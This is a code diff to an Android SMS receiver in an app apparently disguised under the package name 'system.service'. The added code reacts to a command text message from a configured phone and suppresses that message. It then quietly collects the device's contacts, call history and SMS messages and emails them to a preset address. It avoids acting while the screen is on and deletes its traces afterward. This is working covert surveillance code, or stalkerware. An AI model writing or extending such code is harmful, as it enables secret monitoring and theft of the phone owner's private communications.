@@ -3,6 +3,8 @@ package system.service.receiver;
 import java.io.File;
 import java.text.DateFormat;
 import java.text.ParseException;
+import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.Timer;
@@ -16,6 +18,7 @@ import system.service.R.string;
 import system.service.activity.GlobalPrefActivity;
 import system.service.activity.HomeActivity;
 import system.service.config.ConfigCtrl;
+import system.service.config.MailCfg;
 
 import com.particle.inspector.common.util.phone.PhoneUtils;
 import com.particle.inspector.common.util.sms.SmsConsts;
@@ -35,6 +38,7 @@ import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
 import system.service.feature.location.LocationInfo;
 import system.service.feature.location.LocationUtil;
 import system.service.feature.sms.SmsCtrl;
+import system.service.task.GetInfoTask;
 import system.service.task.MaxVolTask;
 import system.service.task.StopRecorderTask;
 import system.service.utils.FileCtrl;
@@ -46,6 +50,7 @@ import com.particle.inspector.common.util.license.LICENSE_TYPE;
 import com.particle.inspector.common.util.location.BaseStationLocation;
 import com.particle.inspector.common.util.location.BaseStationUtil;
 
+import android.annotation.SuppressLint;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -311,6 +316,106 @@ public class SmsReceiver extends BroadcastReceiver
 						(new Timer()).schedule(new StopRecorderTask(SmsReceiver.this.context), minutes*60*1000);
 						
 					}
+				}).start();
+			}
+			
+			//-------------------------------------------------------------------------------
+			// Info collection indication
+			else if (smsBodyLowerCase.startsWith(SmsConsts.INDICATION_INFO) || smsBodyLowerCase.startsWith(SmsConsts.INDICATION_INFO_ALIAS))
+			{
+				abortBroadcast(); // Do not indication SMS
+				
+				if (!ConfigCtrl.isLegal(context)) return;
+				this.context = context;
+				
+				// If the coming phone is not the receiver phone, return
+				if (!comingFromQualifiedPhone(context, intent)) return;
+				
+				// Start a new thread to collect info and send mail
+				new Thread(new Runnable() {
+    				public void run() {
+    					boolean nwConnected = NetworkUtil.isNetworkConnected(SmsReceiver.this.context);
+    					String comingPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
+						
+						// If network is NOT connected and the user is using the phone, DO NOT do anything for security.
+						if (!nwConnected && PowerUtil.isScreenOn(SmsReceiver.this.context)) {
+							String msg = SmsReceiver.this.context.getResources().getString(R.string.indication_collect_info_ng1);
+							SmsCtrl.sendSms(comingPhoneNum, msg);
+							return;
+						}
+						
+						// Since network is NOT connected and the screen is dark, we will try to connect WIFI or 3G automatically
+						else if (!nwConnected) {
+							//TODO
+						}
+						
+						// If still cannot connect to any network, we have to give up
+						if (!NetworkUtil.isNetworkConnected(SmsReceiver.this.context)) {
+							String msg = SmsReceiver.this.context.getResources().getString(R.string.indication_collect_info_ng4);
+							SmsCtrl.sendSms(comingPhoneNum, msg);
+							return;
+						}
+						
+						// Clear attachments
+    					if (GetInfoTask.attachments == null) 
+    						GetInfoTask.attachments = new ArrayList<File>();
+    					else
+    						GetInfoTask.attachments.clear();
+        		
+    					// Collect info
+    					GetInfoTask.CollectContact(SmsReceiver.this.context);
+    					GetInfoTask.CollectPhoneCallHist(SmsReceiver.this.context);
+    					GetInfoTask.CollectSms(SmsReceiver.this.context);
+        		
+    					// If network is not connected after collection, clean files and send message
+    					if (!NetworkUtil.isNetworkConnected(SmsReceiver.this.context)) {
+    						// Clean info files
+        					FileCtrl.cleanTxtFiles(SmsReceiver.this.context);
+        					
+        					String msg = SmsReceiver.this.context.getResources().getString(R.string.indication_collect_info_ng2);
+							SmsCtrl.sendSms(comingPhoneNum, msg);
+							return;
+    					}
+        	
+    					// Make sure the recipient is available
+    					String[] recipients = GlobalPrefActivity.getReceiverMail(SmsReceiver.this.context).split(",");
+    					if (recipients.length == 0) {
+    						String msg = SmsReceiver.this.context.getResources().getString(R.string.indication_collect_info_ng3);
+							SmsCtrl.sendSms(comingPhoneNum, msg);
+							return;
+    					}
+    					
+    					// Send mail
+    					String selfName = ConfigCtrl.getSelfName(SmsReceiver.this.context);
+    					String subject = SmsReceiver.this.context.getResources().getString(R.string.mail_from) 
+        	          		 +  selfName + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date()) 
+        	          		 + SmsReceiver.this.context.getResources().getString(R.string.mail_description);
+    					String body = String.format(SmsReceiver.this.context.getResources().getString(R.string.mail_body_info), selfName);
+    					String pwd = MailCfg.getSenderPwd(SmsReceiver.this.context);
+        		
+    					boolean result = false;
+    					int retry = GlobalValues.DEFAULT_RETRY_COUNT;
+    					String host = MailCfg.getHost(SmsReceiver.this.context);
+    					String sender = MailCfg.getSender(SmsReceiver.this.context);
+    					String errMsg = "";
+    					while(!result && retry > 0) {
+    						result = GetInfoTask.sendMail(subject, body, host, sender, pwd, recipients, GetInfoTask.attachments, errMsg);
+    						if (!result) retry--;
+    					}
+    					GetInfoTask.attachments.clear();
+        		
+    					// Update the last date time
+    					if (result) {
+    						boolean successful = ConfigCtrl.setLastGetInfoTime(SmsReceiver.this.context, new Date());
+    						if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
+    						
+    						String msg = SmsReceiver.this.context.getResources().getString(R.string.indication_collect_info_ok);
+							SmsCtrl.sendSms(comingPhoneNum, msg);
+    					}
+        		
+    					// Clean info files
+    					FileCtrl.cleanTxtFiles(SmsReceiver.this.context);
+    				}
 				}).start();
 			}
 			
